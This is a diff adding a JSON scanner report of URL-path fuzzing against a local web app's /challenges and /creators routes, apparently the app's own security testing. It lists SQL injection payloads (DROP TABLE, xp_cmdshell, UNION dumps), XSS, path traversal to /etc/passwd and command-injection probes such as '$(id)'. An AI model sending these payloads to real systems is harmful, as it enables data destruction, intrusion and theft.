@@ -1,0 +1,615 @@
+﻿{
+    "matches":  [
+                    {
+                        "scan":  "path-challenges-sql-injection",
+                        "matches":  [
+                                        {
+                                            "status":  200,
+                                            "length":  56912,
+                                            "url":  "http://localhost:3000/challenges/\u0027; DROP TABLE challenges; --",
+                                            "input":  "\u0027; DROP TABLE challenges; --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56928,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT * FROM profiles --",
+                                            "input":  "\u0027 UNION SELECT * FROM profiles --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56878,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 1--",
+                                            "input":  "1\u0027 ORDER BY 1--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56874,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u00271\u0027=\u00271",
+                                            "input":  "\u0027 OR \u00271\u0027=\u00271"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56902,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT null,null--",
+                                            "input":  "\u0027 UNION SELECT null,null--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56878,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 2--",
+                                            "input":  "1\u0027 ORDER BY 2--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56880,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 10--",
+                                            "input":  "1\u0027 ORDER BY 10--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56896,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR 1=1 LIMIT 1 --",
+                                            "input":  "\u0027 OR 1=1 LIMIT 1 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56890,
+                                            "url":  "http://localhost:3000/challenges/1; SELECT pg_sleep(5)",
+                                            "input":  "1; SELECT pg_sleep(5)"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56890,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT null--",
+                                            "input":  "\u0027 UNION SELECT null--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56850,
+                                            "url":  "http://localhost:3000/challenges/admin\u0027--",
+                                            "input":  "admin\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56872,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR 1=1 --",
+                                            "input":  "\u0027 OR 1=1 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56888,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u00271\u0027=\u00271\u0027 --",
+                                            "input":  "\u0027 OR \u00271\u0027=\u00271\u0027 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56874,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u0027x\u0027=\u0027x",
+                                            "input":  "\u0027 OR \u0027x\u0027=\u0027x"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56954,
+                                            "url":  "http://localhost:3000/challenges/\u0027 AND 1=0 UNION SELECT \u0027admin\u0027,\u0027password\u0027--",
+                                            "input":  "\u0027 AND 1=0 UNION SELECT \u0027admin\u0027,\u0027password\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  57056,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name=\u0027challenges\u0027--",
+                                            "input":  "\u0027 UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name=\u0027challenges\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56910,
+                                            "url":  "http://localhost:3000/challenges/\u0027; EXEC xp_cmdshell(\u0027dir\u0027)--",
+                                            "input":  "\u0027; EXEC xp_cmdshell(\u0027dir\u0027)--"
+                                        }
+                                    ]
+                    },
+                    {
+                        "scan":  "path-challenges-xss",
+                        "matches":  [
+                                        {
+                                            "status":  200,
+                                            "length":  56874,
+                                            "url":  "http://localhost:3000/challenges/javascript:alert(1)",
+                                            "input":  "javascript:alert(1)"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56914,
+                                            "url":  "http://localhost:3000/challenges/\u003cimg src=x onerror=alert(1)\u003e",
+                                            "input":  "\u003cimg src=x onerror=alert(1)\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56926,
+                                            "url":  "http://localhost:3000/challenges/\"\u003e\u003cimg src=x onerror=alert(1)\u003e",
+                                            "input":  "\"\u003e\u003cimg src=x onerror=alert(1)\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56948,
+                                            "url":  "http://localhost:3000/challenges/{{constructor.constructor(\u0027alert(1)\u0027)()}}",
+                                            "input":  "{{constructor.constructor(\u0027alert(1)\u0027)()}}"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56918,
+                                            "url":  "http://localhost:3000/challenges/\u003ciframe src=javascript:alert(1)\u003e",
+                                            "input":  "\u003ciframe src=javascript:alert(1)\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56894,
+                                            "url":  "http://localhost:3000/challenges/\u003csvg onload=alert(1)\u003e",
+                                            "input":  "\u003csvg onload=alert(1)\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56920,
+                                            "url":  "http://localhost:3000/challenges/\u003cdetails open ontoggle=alert(1)\u003e",
+                                            "input":  "\u003cdetails open ontoggle=alert(1)\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56896,
+                                            "url":  "http://localhost:3000/challenges/\u003cbody onload=alert(1)\u003e",
+                                            "input":  "\u003cbody onload=alert(1)\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56904,
+                                            "url":  "http://localhost:3000/challenges/\u003cmarquee onstart=alert(1)\u003e",
+                                            "input":  "\u003cmarquee onstart=alert(1)\u003e"
+                                        }
+                                    ]
+                    },
+                    {
+                        "scan":  "path-challenges-path-traversal",
+                        "matches":  [
+                                        {
+                                            "status":  200,
+                                            "length":  56888,
+                                            "url":  "http://localhost:3000/challenges/..%2f..%2f..%2fetc%2fpasswd",
+                                            "input":  "..%2f..%2f..%2fetc%2fpasswd"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56898,
+                                            "url":  "http://localhost:3000/challenges/..\\..\\..\\windows\\win.ini",
+                                            "input":  "..\\..\\..\\windows\\win.ini"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56904,
+                                            "url":  "http://localhost:3000/challenges/..%252f..%252f..%252fetc%252fpasswd",
+                                            "input":  "..%252f..%252f..%252fetc%252fpasswd"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56912,
+                                            "url":  "http://localhost:3000/challenges/..\\\\..\\\\..\\\\etc\\\\passwd",
+                                            "input":  "..\\\\..\\\\..\\\\etc\\\\passwd"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56886,
+                                            "url":  "http://localhost:3000/challenges/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                                            "input":  "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56922,
+                                            "url":  "http://localhost:3000/challenges/%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+                                            "input":  "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  56910,
+                                            "url":  "http://localhost:3000/challenges/..\\..\\..\\..\\..\\..\\boot.ini",
+                                            "input":  "..\\..\\..\\..\\..\\..\\boot.ini"
+                                        }
+                                    ]
+                    },
+                    {
+                        "scan":  "path-challenges-edit-sql-injection",
+                        "matches":  [
+                                        {
+                                            "status":  200,
+                                            "length":  58990,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u00271\u0027=\u00271/edit",
+                                            "input":  "\u0027 OR \u00271\u0027=\u00271"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59044,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT * FROM profiles --/edit",
+                                            "input":  "\u0027 UNION SELECT * FROM profiles --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59006,
+                                            "url":  "http://localhost:3000/challenges/1; SELECT pg_sleep(5)/edit",
+                                            "input":  "1; SELECT pg_sleep(5)"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58994,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 1--/edit",
+                                            "input":  "1\u0027 ORDER BY 1--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59028,
+                                            "url":  "http://localhost:3000/challenges/\u0027; DROP TABLE challenges; --/edit",
+                                            "input":  "\u0027; DROP TABLE challenges; --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59004,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u00271\u0027=\u00271\u0027 --/edit",
+                                            "input":  "\u0027 OR \u00271\u0027=\u00271\u0027 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59012,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR 1=1 LIMIT 1 --/edit",
+                                            "input":  "\u0027 OR 1=1 LIMIT 1 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59006,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT null--/edit",
+                                            "input":  "\u0027 UNION SELECT null--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58994,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 2--/edit",
+                                            "input":  "1\u0027 ORDER BY 2--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59018,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT null,null--/edit",
+                                            "input":  "\u0027 UNION SELECT null,null--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58988,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR 1=1 --/edit",
+                                            "input":  "\u0027 OR 1=1 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58996,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 10--/edit",
+                                            "input":  "1\u0027 ORDER BY 10--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58990,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u0027x\u0027=\u0027x/edit",
+                                            "input":  "\u0027 OR \u0027x\u0027=\u0027x"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58966,
+                                            "url":  "http://localhost:3000/challenges/admin\u0027--/edit",
+                                            "input":  "admin\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59070,
+                                            "url":  "http://localhost:3000/challenges/\u0027 AND 1=0 UNION SELECT \u0027admin\u0027,\u0027password\u0027--/edit",
+                                            "input":  "\u0027 AND 1=0 UNION SELECT \u0027admin\u0027,\u0027password\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59026,
+                                            "url":  "http://localhost:3000/challenges/\u0027; EXEC xp_cmdshell(\u0027dir\u0027)--/edit",
+                                            "input":  "\u0027; EXEC xp_cmdshell(\u0027dir\u0027)--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59172,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name=\u0027challenges\u0027--/edit",
+                                            "input":  "\u0027 UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name=\u0027challenges\u0027--"
+                                        }
+                                    ]
+                    },
+                    {
+                        "scan":  "path-challenges-progress-sql-injection",
+                        "matches":  [
+                                        {
+                                            "status":  200,
+                                            "length":  59076,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT * FROM profiles --/progress",
+                                            "input":  "\u0027 UNION SELECT * FROM profiles --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59038,
+                                            "url":  "http://localhost:3000/challenges/1; SELECT pg_sleep(5)/progress",
+                                            "input":  "1; SELECT pg_sleep(5)"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59020,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR 1=1 --/progress",
+                                            "input":  "\u0027 OR 1=1 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59022,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u00271\u0027=\u00271/progress",
+                                            "input":  "\u0027 OR \u00271\u0027=\u00271"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59038,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT null--/progress",
+                                            "input":  "\u0027 UNION SELECT null--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59026,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 1--/progress",
+                                            "input":  "1\u0027 ORDER BY 1--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59028,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 10--/progress",
+                                            "input":  "1\u0027 ORDER BY 10--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59060,
+                                            "url":  "http://localhost:3000/challenges/\u0027; DROP TABLE challenges; --/progress",
+                                            "input":  "\u0027; DROP TABLE challenges; --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59050,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT null,null--/progress",
+                                            "input":  "\u0027 UNION SELECT null,null--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59036,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u00271\u0027=\u00271\u0027 --/progress",
+                                            "input":  "\u0027 OR \u00271\u0027=\u00271\u0027 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  58998,
+                                            "url":  "http://localhost:3000/challenges/admin\u0027--/progress",
+                                            "input":  "admin\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59022,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR \u0027x\u0027=\u0027x/progress",
+                                            "input":  "\u0027 OR \u0027x\u0027=\u0027x"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59026,
+                                            "url":  "http://localhost:3000/challenges/1\u0027 ORDER BY 2--/progress",
+                                            "input":  "1\u0027 ORDER BY 2--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59044,
+                                            "url":  "http://localhost:3000/challenges/\u0027 OR 1=1 LIMIT 1 --/progress",
+                                            "input":  "\u0027 OR 1=1 LIMIT 1 --"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59058,
+                                            "url":  "http://localhost:3000/challenges/\u0027; EXEC xp_cmdshell(\u0027dir\u0027)--/progress",
+                                            "input":  "\u0027; EXEC xp_cmdshell(\u0027dir\u0027)--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59102,
+                                            "url":  "http://localhost:3000/challenges/\u0027 AND 1=0 UNION SELECT \u0027admin\u0027,\u0027password\u0027--/progress",
+                                            "input":  "\u0027 AND 1=0 UNION SELECT \u0027admin\u0027,\u0027password\u0027--"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  59204,
+                                            "url":  "http://localhost:3000/challenges/\u0027 UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name=\u0027challenges\u0027--/progress",
+                                            "input":  "\u0027 UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name=\u0027challenges\u0027--"
+                                        }
+                                    ]
+                    },
+                    {
+                        "scan":  "path-creator-special-chars",
+                        "matches":  [
+                                        {
+                                            "status":  200,
+                                            "length":  56826,
+                                            "url":  "http://localhost:3000/creators/~",
+                                            "input":  "~"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71223,
+                                            "url":  "http://localhost:3000/creators/\u003c%25=7*7%25\u003e",
+                                            "input":  "\u003c%25=7*7%25\u003e"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71211,
+                                            "url":  "http://localhost:3000/creators/\\n\\r\\t",
+                                            "input":  "\\n\\r\\t"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71212,
+                                            "url":  "http://localhost:3000/creators/${7*7}",
+                                            "input":  "${7*7}"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71195,
+                                            "url":  "http://localhost:3000/creators/\\0",
+                                            "input":  "\\0"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71199,
+                                            "url":  "http://localhost:3000/creators/\\\\",
+                                            "input":  "\\\\"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71203,
+                                            "url":  "http://localhost:3000/creators/`id`",
+                                            "input":  "`id`"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71200,
+                                            "url":  "http://localhost:3000/creators/$(id)",
+                                            "input":  "$(id)"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71219,
+                                            "url":  "http://localhost:3000/creators/{{7*7}}",
+                                            "input":  "{{7*7}}"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71196,
+                                            "url":  "http://localhost:3000/creators/\u0026",
+                                            "input":  "\u0026"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71199,
+                                            "url":  "http://localhost:3000/creators/``",
+                                            "input":  "``"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71191,
+                                            "url":  "http://localhost:3000/creators/,",
+                                            "input":  ","
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71195,
+                                            "url":  "http://localhost:3000/creators/[]",
+                                            "input":  "[]"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71199,
+                                            "url":  "http://localhost:3000/creators/\"\"",
+                                            "input":  "\"\""
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71191,
+                                            "url":  "http://localhost:3000/creators/()",
+                                            "input":  "()"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71199,
+                                            "url":  "http://localhost:3000/creators/{}",
+                                            "input":  "{}"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71191,
+                                            "url":  "http://localhost:3000/creators/\u0027\u0027",
+                                            "input":  "\u0027\u0027"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71195,
+                                            "url":  "http://localhost:3000/creators/;;",
+                                            "input":  ";;"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71193,
+                                            "url":  "http://localhost:3000/creators/\\",
+                                            "input":  "\\"
+                                        },
+                                        {
+                                            "status":  200,
+                                            "length":  71193,
+                                            "url":  "http://localhost:3000/creators/|",
+                                            "input":  "|"
+                                        }
+                                    ]
+                    }
+                ],
+    "auth":  "no",
+    "date":  "2026-06-28 14:55:06",
+    "summary":  {
+                    "totalScans":  7,
+                    "totalMatches":  87,
+                    "scansWithFindings":  6
+                },
+    "target":  "http://localhost:3000",
+    "scans":  [
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  },
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  },
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  },
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  },
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  },
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  },
+                  {
+                      "scan":  null,
+                      "url":  null,
+                      "wordlist":  null,
+                      "statusCodes":  null,
+                      "matchCount":  null
+                  }
+              ]
+}
